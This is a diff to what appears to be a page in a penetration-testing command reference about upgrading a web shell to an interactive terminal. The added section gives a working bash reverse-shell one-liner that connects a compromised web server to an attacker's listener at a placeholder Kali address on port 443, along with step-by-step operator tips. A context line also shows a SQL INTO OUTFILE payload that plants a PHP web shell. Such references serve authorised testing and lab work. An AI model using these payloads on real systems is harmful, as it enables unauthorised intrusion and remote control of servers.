@@ -7,7 +7,37 @@ boost: 10
 hideFooterPagination: true
 ---
 
+import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+
 {/* Generated from Commands/web-shell-to-terminal.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+
+## Current operation: Connect a Linux web execution context to a listener
+
+**Run in:** Linux web application's command-execution field. **Requires:** Confirmed OS-command execution, Bash support, correct request encoding and a reachable Kali listener on TCP 443; the web worker's identity remains the starting identity.
+
+```bash
+bash -c 'bash -i >& /dev/tcp/KALI_IP/443 0>&1'
+```
+
+**Read the result:** Prove command execution and network direction separately, then establish a usable shell and verify identity.
+
+**If The HTTP request stalls but no shell appears:** A web response, a TCP callback and an interactive terminal are different stages; shell syntax and listener/payload compatibility matter.
+
+**Next check:** Inspect callback reachability and server-side process limits; if a shell arrives, record id, pwd and network context before selecting a terminal-upgrade method.
+
+**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
+
+### Reviewed operation documentation
+
+- [Primary reference 1](https://www.gnu.org/software/bash/manual/html_node/Redirections.html)
+
+## Preserved earlier notes
+
+<PreservedNotes>
+
+Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
 
 ## Web shell → terminal: choose the operation and read the result
 
@@ -220,3 +250,5 @@ SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
 - [Evil-WinRM](/commands/evil-winrm)
 
 {/* VAULT_RELATED_END */}
+
+</PreservedNotes>
